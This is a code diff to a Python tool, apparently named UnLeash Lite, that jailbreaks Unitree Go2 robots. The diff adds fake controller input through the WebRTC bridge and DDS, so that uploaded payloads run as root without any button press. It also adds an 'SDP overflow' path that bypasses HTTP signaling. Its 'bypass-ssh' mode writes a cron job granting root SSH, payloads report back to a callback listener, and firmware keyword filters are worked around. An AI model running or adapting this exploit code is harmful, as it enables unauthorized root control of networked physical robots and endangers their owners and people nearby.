@@ -2,8 +2,10 @@
 WebRTC jailbreak orchestrator for Unitree Go2.
 
 Uploads Python payloads via the WebRTC data channel to programming_actuator,
-bound to a controller hotkey. Execution happens when the user presses the
-hotkey on the physical controller. Requires LAN adjacency only.
+bound to a controller hotkey. The hotkey is triggered automatically via the
+WebRTC bridge (which forwards controller messages to the internal DDS bus
+from inside the DDS security perimeter). No physical controller needed.
+Requires LAN adjacency only.
 """
 
 import asyncio
@@ -11,6 +13,7 @@ import logging
 
 from .webrtc import Go2DataChannel
 from .webrtc_payloads import WebRTCPayload, validate_bypass_payload
+from .webrtc_sdp import Go2DataChannelSDP, dds_trigger_hotkey
 
 logger = logging.getLogger("unleash_lite.webrtc_jailbreak")
 
@@ -43,16 +46,17 @@ class WebRTCJailbreakOrchestrator:
         self.aes_128_key = aes_128_key
 
     async def execute(self, wait_for_callback=True, callback_timeout=120.0):
-        """Three-phase jailbreak: upload -> instruct -> verify."""
+        """Four-phase jailbreak: upload -> verify -> trigger -> confirm."""
         p = self.payload
         hotkey = p.bind_hotkey
 
         print()
         print(f"  {C}{'=' * 62}{RESET}")
         print(f"  {C}{BOLD}  UnLeash Lite — WebRTC Jailbreak{RESET}")
-        print(f"  {C}  Target: {self.robot_ip}:{self.signaling_port}{RESET}")
-        print(f"  {C}  Mode:   {p.name} — {p.description}{RESET}")
-        print(f"  {C}  Hotkey: {hotkey}{RESET}")
+        print(f"  {C}  Target:  {self.robot_ip}:{self.signaling_port}{RESET}")
+        print(f"  {C}  Mode:    {p.name} — {p.description}{RESET}")
+        print(f"  {C}  Hotkey:  {hotkey}{RESET}")
+        print(f"  {C}  Trigger: bridge (no physical controller needed){RESET}")
         print(f"  {C}{'=' * 62}{RESET}")
 
         ok, kw = validate_bypass_payload(p.python_code)
@@ -64,7 +68,7 @@ class WebRTCJailbreakOrchestrator:
 
         print()
 
-        # Phase 1: Connect and upload
+        # Phase 1: Callback listener
         callback_received = asyncio.Event()
         callback_data = []
         server = None
@@ -114,26 +118,12 @@ class WebRTCJailbreakOrchestrator:
                     server.close()
                 return False
 
-            print(f"  {G}[4/5]{RESET} Verifying registration...")
-            programs, list_resp = await dc.list_programs()
-            registered = any(
-                prog.get("program_uuid") == p.program_uuid
-                for prog in programs
-            )
-            if registered:
-                print(f"         {DIM}Registered on {hotkey}{RESET}")
-            else:
-                print(f"  {Y}       Not found in hotkey list (may still work){RESET}")
-                if programs:
-                    print(f"  {Y}       Hotkey list returned:{RESET}")
-                    for prog in programs:
-                        print(f"  {Y}         {prog}{RESET}")
-                elif list_resp:
-                    print(f"  {Y}       Raw list response:{RESET}")
-                    _dump_response("list", list_resp)
+            print(f"  {G}[4/5]{RESET} Triggering {hotkey} via bridge...")
+            await dc.trigger_hotkey(hotkey)
+            print(f"         {DIM}Trigger sent (no controller needed){RESET}")
 
         except Exception as e:
-            print(f"  {R}  Error during upload:{RESET} {e}")
+            print(f"  {R}  Error during upload/trigger:{RESET} {e}")
             await dc.close()
             if server:
                 server.close()
@@ -141,23 +131,22 @@ class WebRTCJailbreakOrchestrator:
 
         await dc.close()
 
-        # Phase 2: Instruct user
         print()
         print(f"  {G}╔{'═' * 60}╗{RESET}")
-        print(f"  {G}║{RESET}  {BOLD}PAYLOAD STAGED{RESET} — "
-              f"Press {BOLD}{hotkey}{RESET} on the Go2 controller"
-              f"       {G}║{RESET}")
+        print(f"  {G}║{RESET}  {BOLD}PAYLOAD DELIVERED + TRIGGERED{RESET}"
+              f"                              {G}║{RESET}")
         print(f"  {G}╚{'═' * 60}╝{RESET}")
         print()
-        print(f"  {DIM}Written to: /unitree/etc/programming/{p.program_uuid}.py{RESET}")
-        print(f"  {DIM}Executes as root when {hotkey} is pressed on the controller.{RESET}")
+        print(f"  {DIM}Script: /unitree/etc/programming/"
+              f"{p.program_uuid}.py{RESET}")
 
         if p.name == "bypass-ssh":
             print()
-            print(f"  {C}  After pressing {hotkey}, wait up to 60s for the cron job.{RESET}")
+            print(f"  {C}  Cron job written. Wait up to 60s for crond "
+                  f"to execute.{RESET}")
             print(f"  {C}  Then: ssh root@{self.robot_ip}{RESET}")
 
-        # Phase 3: Wait for callback
+        # Phase 4: Wait for callback
         if wait_for_callback and self.callback_ip and server:
             print()
             print(f"  {G}[5/5]{RESET} Waiting for callback ({int(callback_timeout)}s)...")
@@ -174,8 +163,146 @@ class WebRTCJailbreakOrchestrator:
                 server.close()
                 return True
             except asyncio.TimeoutError:
-                print(f"\n  {Y}No callback received.{RESET} "
-                      f"Press {BOLD}{hotkey}{RESET} on the controller to execute.")
+                print(f"\n  {Y}No callback received within timeout.{RESET}")
+                server.close()
+                return False
+        else:
+            print(f"\n  {DIM}[5/5] Callback verification skipped{RESET}")
+            return True
+
+
+class SDPJailbreakOrchestrator:
+    """Jailbreak via SDP overflow — bypasses HTTP signaling entirely."""
+
+    def __init__(self, payload, interface_ip=None, callback_ip=None,
+                 callback_port=19999):
+        self.payload = payload
+        self.interface_ip = interface_ip
+        self.callback_ip = callback_ip
+        self.callback_port = callback_port
+
+    async def execute(self, wait_for_callback=True, callback_timeout=120.0):
+        p = self.payload
+        hotkey = p.bind_hotkey
+
+        print()
+        print(f"  {C}{'=' * 62}{RESET}")
+        print(f"  {C}{BOLD}  UnLeash Lite — SDP Overflow Jailbreak{RESET}")
+        print(f"  {C}  Mode:      {p.name} — {p.description}{RESET}")
+        print(f"  {C}  Hotkey:    {hotkey}{RESET}")
+        print(f"  {C}  Signaling: DDS multicast (bypasses HTTP/port 9991){RESET}")
+        print(f"  {C}  Trigger:   DDS fake controller (no physical remote){RESET}")
+        print(f"  {C}{'=' * 62}{RESET}")
+
+        ok, kw = validate_bypass_payload(p.python_code)
+        if not ok:
+            print()
+            print(f"  {Y}  WARNING: Payload contains blocked keyword {kw!r}.{RESET}")
+            print(f"  {Y}  This mode will NOT work on firmware >= 1.1.14{RESET}")
+            print(f"  {Y}  (programming_actuator 1.0.5.5+). Use a bypass- mode.{RESET}")
+
+        print()
+
+        # Phase 1: Callback listener
+        callback_received = asyncio.Event()
+        callback_data = []
+        server = None
+
+        if self.callback_ip and wait_for_callback:
+            async def handle_callback(reader, writer):
+                data = await reader.read(8192)
+                callback_data.append(data.decode(errors='replace'))
+                callback_received.set()
+                writer.close()
+
+            try:
+                server = await asyncio.start_server(
+                    handle_callback, '0.0.0.0', self.callback_port)
+                print(f"  {G}[1/5]{RESET} Callback listener on port "
+                      f"{self.callback_port}")
+            except OSError as e:
+                print(f"  {Y}[1/5]{RESET} Callback listener failed "
+                      f"({e}) — skipping")
+                wait_for_callback = False
+        else:
+            print(f"  {DIM}[1/5]{RESET} Callback listener skipped")
+
+        # Phase 2: Connect via SDP overflow + fire upload
+        dc = Go2DataChannelSDP(interface_ip=self.interface_ip)
+
+        try:
+            print(f"  {G}[2/5]{RESET} SDP overflow via DDS multicast...")
+            print(f"         {DIM}Interface: {dc.interface_ip}{RESET}")
+            print(f"         {DIM}Waiting for SEDP discovery (3s)...{RESET}")
+            result = await dc.connect_and_fire(p)
+            success, status, resp = result
+
+            if success is True:
+                print(f"  {G}[3/5]{RESET} Upload accepted (status {status})")
+            elif success is None:
+                print(f"  {Y}[3/5]{RESET} Upload sent but unconfirmed "
+                      f"(SDK closed session)")
+                print(f"         {DIM}Proceeding with trigger anyway{RESET}")
+            else:
+                print(f"  {R}[3/5] Upload failed (status {status}){RESET}")
+                if resp:
+                    _dump_response("upload", resp)
+                if server:
+                    server.close()
+                return False
+        except Exception as e:
+            print(f"  {R}[2/5] SDP overflow connection failed:{RESET} {e}")
+            if server:
+                server.close()
+            return False
+        finally:
+            await dc.close()
+
+        # Phase 3: Trigger via fake controller input
+        print(f"  {G}[4/5]{RESET} Triggering {hotkey} via DDS...")
+        print(f"         {DIM}SEDP discovery (3s)...{RESET}")
+        try:
+            await asyncio.to_thread(
+                dds_trigger_hotkey, dc.interface_ip, hotkey)
+            print(f"         {DIM}Controller trigger sent{RESET}")
+        except Exception as e:
+            print(f"  {Y}       Trigger failed ({e}) — "
+                  f"press {hotkey} manually{RESET}")
+
+        print()
+        print(f"  {G}╔{'═' * 60}╗{RESET}")
+        print(f"  {G}║{RESET}  {BOLD}PAYLOAD DELIVERED + TRIGGERED{RESET}"
+              f"                              {G}║{RESET}")
+        print(f"  {G}╚{'═' * 60}╝{RESET}")
+        print()
+        print(f"  {DIM}Script: /unitree/etc/programming/"
+              f"{p.program_uuid}.py{RESET}")
+
+        if p.name == "bypass-ssh":
+            print()
+            print(f"  {C}  Cron job written. Wait up to 60s for crond "
+                  f"to execute.{RESET}")
+            print(f"  {C}  Then: ssh root@192.168.123.161{RESET}")
+
+        # Phase 4: Wait for callback
+        if wait_for_callback and self.callback_ip and server:
+            print()
+            print(f"  {G}[5/5]{RESET} Waiting for callback "
+                  f"({int(callback_timeout)}s)...")
+            try:
+                await asyncio.wait_for(
+                    callback_received.wait(), timeout=callback_timeout)
+                print()
+                print(f"  {G}{'=' * 62}{RESET}")
+                print(f"  {G}{BOLD}  JAILBREAK CONFIRMED{RESET}")
+                for line in callback_data:
+                    for l in line.strip().split('\n'):
+                        print(f"  {G}  {l}{RESET}")
+                print(f"  {G}{'=' * 62}{RESET}")
+                server.close()
+                return True
+            except asyncio.TimeoutError:
+                print(f"\n  {Y}No callback received within timeout.{RESET}")
                 server.close()
                 return False
         else:
